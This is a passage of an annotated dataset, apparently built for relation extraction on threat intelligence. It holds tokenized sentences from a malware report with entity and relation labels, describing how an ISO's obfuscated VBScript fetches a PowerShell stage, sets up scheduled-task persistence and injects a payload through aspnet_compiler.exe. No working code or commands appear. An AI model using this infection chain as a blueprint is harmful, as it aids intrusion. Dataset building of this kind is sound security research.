"pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [50, 50], "name": "'Office . vbs", "pos": [7, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "infection process", "pos": [18, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [72, 72], "name": "Office . vbs", "pos": [8, 11], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [83, 83], "name": "PowerShell", "pos": [19, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "WScript", "pos": [23, 24], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "Office.bat", "pos": [31, 32], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "PowerShell script", "pos": [9, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "'Office.ps1", "pos": [12, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [120, 120], "name": "PowerShell", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "Office", "pos": [16, 17], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [152, 152], "name": "process", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [159, 159], "name": "Microsofd.vbs", "pos": [12, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [172, 172], "name": "Microsofd.bat", "pos": [25, 26], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "process", "pos": [31, 32], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 4}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 2, "t": 6}, {"r": "FR", "evidence": [3], "h": 3, "t": 5}, {"r": "EX", "evidence": [3], "t": 4, "h": 5}, {"r": "CO", "evidence": [3, 4], "h": 3, "t": 7}, {"r": "FR", "evidence": [4], "h": 7, "t": 8}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "FR", "evidence": [6, 7], "h": 12, "t": 17}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "EX", "evidence": [7], "h": 14, "t": 15}, {"r": "EX", "evidence": [7], "t": 16, "h": 17}]}, {"title": "023-6", "sents": [["It", "then", "creates", "several", "additional", "scripts", ",", "and", "content", "is", "written", "into", "each", "of", "them", "in", "a", "similar", "format", "."], ["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", "."], ["As", "part", "of", "the", "creation", "process", ",", "this", "scheduled", "task", "executes", "``", "Microsofd.vbs", ",", "''", "which", "initiates", "a", "short", "sleep", "before", "continuing", "to", "execute", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["Finally", ",", "this", "batch", "file", "invokes", "PowerShell", "and", "executes", "'Microsofd", ".", "ps1", "'", ",", "the", "final", "script", "in", "the", "chain", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "scripts", "pos": [5, 6], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [37, 37], "name": "PowerShell", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "'Office . vbs", "pos": [7, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "infection process", "pos": [18, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "Office . vbs", "pos": [8, 11], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [72, 72], "name": "PowerShell", "pos": [19, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "WScript", "pos": [23, 24], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "Office.bat", "pos": [31, 32], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "PowerShell script", "pos": [9, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [104, 104], "name": "'Office.ps1", "pos": [12, 13], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [109, 109], "name": "PowerShell", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "Office", "pos": [16, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "process", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [148, 148], "name": "Microsofd.vbs", "pos": [12, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [161, 161], "name": "Microsofd.bat", "pos": [25, 26], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [167, 167], "name": "process", "pos": [31, 32], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [175, 175], "name": "PowerShell", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "'Microsofd . ps1", "pos": [9, 12], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 5}, {"r": "FR", "evidence": [2], "h": 2, "t": 4}, {"r": "EX", "evidence": [2], "t": 3, "h": 4}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 6}, {"r": "FR", "evidence": [3], "h": 6, "t": 7}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "FR", "evidence": [5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5, 6], "h": 11, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "h": 13, "t": 14}, {"r": "EX", "evidence": [6], "t": 15, "h": 16}, {"r": "EX", "evidence": [7], "h": 17, "t": 18}]}, {"title": "023-7", "sents": [["All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."], ["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", "."], ["As", "part", "of", "the", "creation", "process", ",", "this", "scheduled", "task", "executes", "``", "Microsofd.vbs", ",", "''", "which", "initiates", "a", "short", "sleep", "before", "continuing", "to", "execute", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["Finally", ",", "this", "batch", "file", "invokes", "PowerShell", "and", "executes", "'Microsofd", ".", "ps1", "'", ",", "the", "final", "script", "in", "the", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."]], "vertexSet": [[{"type": "TP", "sent_id": 1, "global_pos": [17, 17], "name": "PowerShell", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "'Office . vbs", "pos": [7, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "infection process", "pos": [18, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "Office . vbs", "pos": [8, 11], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [52, 52], "name": "PowerShell", "pos": [19, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "WScript", "pos": [23, 24], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "Office.bat", "pos": [31, 32], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "PowerShell script", "pos": [9, 11], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "'Office.ps1", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "PowerShell", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "Office", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [121, 121], "name": "process", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [128, 128], "name": "Microsofd.vbs", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [141, 141], "name": "Microsofd.bat", "pos": [25, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [147, 147], "name": "process", "pos": [31, 32], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [155, 155], "name": "PowerShell", "pos": [6, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [158, 158], "name": "'Microsofd . ps1", "pos": [9, 12], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "GZIP", "pos": [5, 6], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "t": 1, "h": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [3], "h": 7, "t": 8}, {"r": "FR", "evidence": [4], "h": 9, "t": 10}, {"r": "FR", "evidence": [4, 5], "h": 9, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "EX", "evidence": [5], "h": 11, "t": 12}, {"r": "EX", "evidence": [5], "t": 13, "h": 14}, {"r": "EX", "evidence": [6], "h": 15, "t": 16}]}, {"title": "023-8", "sents": [["Finally", ",", "the", "Stage", "2", "PowerShell", "executes", "'Office", ".", "vbs", "'", "to", "begin", "the", "next", "step", "of", "the", "infection", "process", "."], ["Following", "this", ",", "the", "first", "script", ",", "``", "Office", ".", "vbs", ",", "''", "is", "executed", "by", "the", "Stage", "2", "PowerShell", ",", "which", "invokes", "WScript", "to", "execute", "a", "batch", "file", "named", "``", "Office.bat", "''", "to", "further", "the", "infection", "process", "."], ["This", "batch", "file", ",", "in", "turn", ",", "executes", "a", "PowerShell", "script", "called", "'Office.ps1", "'", "."], ["The", "next", "PowerShell", "script", "attempts", "to", "achieve", "persistence", "by", "creating", "a", "new", "Scheduled", "Task", "called", "``", "Office", "''", "that", "is", "executed", "immediately", "and", "then", "repeated", "every", "two", "minutes", "."], ["As", "part", "of", "the", "creation", "process", ",", "this", "scheduled", "task", "executes", "``", "Microsofd.vbs", ",", "''", "which", "initiates", "a", "short", "sleep", "before", "continuing", "to", "execute", "``", "Microsofd.bat", "''", "to", "continue", "the", "infection", "process", "."], ["Finally", ",", "this", "batch", "file", "invokes", "PowerShell", "and", "executes", "'Microsofd", ".", "ps1", "'", ",", "the", "final", "script", "in", "the", "chain", "."], ["This", "script", "contains", "two", "large", "GZIP", "blobs", "and", "another", "function", "responsible", "for", "decompressing", "them", "."], ["The", "script", "accomplishes", "this", "by", "invoking", "aspnet_compiler.exe", ",", "injecting", "the", "final", "payload", ",", "and", "executing", "it", "to", "complete", "the", "infection", "process", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "PowerShell", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "'Office . vbs", "pos": [7, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "infection process", "pos": [18, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "Office . vbs", "pos": [8, 11], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "PowerShell", "pos": [19, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "WScript", "pos": [23, 24], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "Office.bat", "pos": [31, 32], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "PowerShell script", "pos": [9, 11], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "'Office.ps1", "pos": [12, 13], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "PowerShell", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [91, 91], "name": "Office", "pos": [16, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [109, 109], "name": "process", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "Microsofd.vbs", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [129, 129], "name": "Microsofd.bat", "pos": [25, 26], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [135, 135], "name": "process", "pos": [31, 32], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "PowerShell", "pos": [6, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [146, 146], "name": "'Microsofd . ps1", "pos": [9, 12], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "GZIP", "pos": [5, 6], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "aspnet_compiler.exe", "pos": [6, 7], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "payload", "pos": [11, 12], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "FR", "evidence": [3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 11}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "EX", "evidence": [4], "t": 13, "h": 14}, {"r": "EX", "evidence": [5], "h": 15, "t": 16}, {"r": "FR", "evidence": [5, 6, 7], "h": 15, "t": 18}, {"r": "UK", "evidence": [6, 7], "t": 17, "h": 18}, {"r": "IJ", "evidence": [7], "h": 18, "t": 19}]}, {"title": "068-0", "sents": [["The", "infections", "leverage", "process", "injection", "to", "evade", "detection", "by", "endpoint", "security", "software", "."], ["The", "threat", "actor", "(", "s", ")", "behind", "these", "campaigns", "have", "been", "using", "3LOSH", "to", "generate", "the", "obfuscated", "code", "responsible", "for", "the", "initial", "infection", "process", "."], ["Infection", "processThe", "infection", "process", "begins", "with", "an", "ISO", "that", "contains", "a", "malicious", "VBScript", "that", ",", "when", "executed", ",", "initiates", "a", "multi-stage", "infection", "process", "."], ["(", "VBS|ISO", ")", "$", "Stage", "1", "ExecutionThe", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "to", "attempt", "to", "obfuscate", "the", "executed", "code", "."], ["Once", "deobfuscated", ",", "the", "VBS", "execution", "is", "straightforward", ":", "It", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "."], ["Stage", "2", "retrievalAs", "expected", ",", "the", "retrieved", "content", "is", "a", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "and", "executed", "to", "continue", "the", "infection", "process", "."], ["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "threat actor", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "3LOSH", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "obfuscated code", "pos": [16, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "infection process", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "ISO", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "VBScript", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "multi-stage infection process", "pos": [20, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "VBS", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "junk data", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "VBS", "pos": [4, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [94, 94], "name": "It", "pos": [9, 10], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [103, 103], "name": "attacker-controlled server", "pos": [18, 20], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [112, 112], "name": "retrieved content", "pos": [6, 8], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [116, 116], "name": "PowerShell script", "pos": [10, 12], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [122, 122], "name": "( IEX ) cmdlet", "pos": [16, 20], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "It", "pos": [0, 1], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [143, 143], "name": "scripts", "pos": [9, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "script", "pos": [3, 4], "index": "17_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [185, 185], "name": "directory", "pos": [10, 11], "index": "18_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 0, "t": 2}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 3, "t": 6}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "EX", "evidence": [4], "t": 9, "h": 10}, {"r": "ST", "evidence": [4], "h": 10, "t": 11}, {"r": "RF", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "IJ", "evidence": [4, 5], "h": 10, "t": 14}, {"r": "FR", "evidence": [5], "t": 13, "h": 14}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "FR", "evidence": [6, 7], "h": 15, "t": 17}, {"r": "EX", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}]}, {"title": "068-1", "sents": [["The", "threat", "actor", "(", "s", ")", "behind", "these", "campaigns", "have", "been", "using", "3LOSH", "to", "generate", "the", "obfuscated", "code", "responsible", "for", "the", "initial", "infection", "process", "."], ["Infection", "processThe", "infection", "process", "begins", "with", "an", "ISO", "that", "contains", "a", "malicious", "VBScript", "that", ",", "when", "executed", ",", "initiates", "a", "multi-stage", "infection", "process", "."], ["(", "VBS|ISO", ")", "$", "Stage", "1", "ExecutionThe", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "to", "attempt", "to", "obfuscate", "the", "executed", "code", "."], ["Once", "deobfuscated", ",", "the", "VBS", "execution", "is", "straightforward", ":", "It", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "."], ["Stage", "2", "retrievalAs", "expected", ",", "the", "retrieved", "content", "is", "a", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "and", "executed", "to", "continue", "the", "infection", "process", "."], ["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "threat actor", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "3LOSH", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "obfuscated code", "pos": [16, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "infection process", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "ISO", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "VBScript", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "multi-stage infection process", "pos": [20, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "VBS", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": "junk data", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "VBS", "pos": [4, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "It", "pos": [9, 10], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [90, 90], "name": "attacker-controlled server", "pos": [18, 20], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [99, 99], "name": "retrieved content", "pos": [6, 8], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [103, 103], "name": "PowerShell script", "pos": [10, 12], "index": "13_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [109, 109], "name": "( IEX ) cmdlet", "pos": [16, 20], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [121, 121], "name": "It", "pos": [0, 1], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [130, 130], "name": "scripts", "pos": [9, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [165, 165], "name": "script", "pos": [3, 4], "index": "17_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [172, 172], "name": "directory", "pos": [10, 11], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [193, 193], "name": "script", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [197, 197], "name": "additional scripts", "pos": [5, 7], "index": "20_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 6}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "EX", "evidence": [3], "t": 9, "h": 10}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "IJ", "evidence": [3, 4], "h": 10, "t": 14}, {"r": "FR", "evidence": [4], "t": 13, "h": 14}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "FR", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "EX", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "CO", "evidence": [6, 7], "h": 17, "t": 19}, {"r": "WR", "evidence": [7], "h": 19, "t": 20}]}, {"title": "068-2", "sents": [["Infection", "processThe", "infection", "process", "begins", "with", "an", "ISO", "that", "contains", "a", "malicious", "VBScript", "that", ",", "when", "executed", ",", "initiates", "a", "multi-stage", "infection", "process", "."], ["(", "VBS|ISO", ")", "$", "Stage", "1", "ExecutionThe", "VBS", "contains", "junk", "data", "and", "uses", "string", "replacement", "to", "attempt", "to", "obfuscate", "the", "executed", "code", "."], ["Once", "deobfuscated", ",", "the", "VBS", "execution", "is", "straightforward", ":", "It", "retrieves", "and", "executes", "the", "next", "stage", "from", "an", "attacker-controlled", "server", "."], ["Stage", "2", "retrievalAs", "expected", ",", "the", "retrieved", "content", "is", "a", "PowerShell", "script", "passed", "to", "the", "Invoke-Expression", "(", "IEX", ")", "cmdlet", "and", "executed", "to", "continue", "the", "infection", "process", "."], ["It", "is", "mainly", "responsible", "for", "creating", "a", "series", "of", "scripts", "that", "are", "executed", "and", "carry", "out", "various", "tasks", "needed", "for", "the", "malware", "to", "function.Across", "various", "samples", "analyzed", ",", "the", "directory", "locations", "and", "file", "names", "vary", ",", "but", "are", "functionally", "equivalent", "."], ["First", ",", "the", "script", "checks", "for", "the", "existence", "of", "a", "directory", "at", "the", "following", "location", ":", "C", ":", "\\ProgramData\\Facebook\\System32\\Microsoft\\SystemDataIf", "it", "does", "n't", "already", "exist", ",", "the", "directory", "is", "created", "."], ["The", "script", "then", "creates", "several", "additional", "scripts", ",", "writing", "content", "into", "each", "of", "them", "using", "a", "format", "similar", "to", "the", "following", "example", "."], ["The", "following", "files", "are", "created", "in", "this", "manner", ":", "Office.batOffice.vbsOffice.ps1Microsofd.batMicrosofd.vbsMicrosofd.ps1All", "of", "these", "scripts", "are", "stored", "in", "the", "previously", "created", "directory", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "infection process", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "ISO", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "VBScript", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "multi-stage infection process", "pos": [20, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "VBS", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "junk data", "pos": [9, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "VBS", "pos": [4, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "It", "pos": [9, 10], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [65, 65], "name": "attacker-controlled server", "pos": [18, 20], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [74, 74], "name": "retrieved content", "pos": [6, 8], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [78, 78], "name": "PowerShell script", "pos": [10, 12], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [84, 84], "name": "( IEX 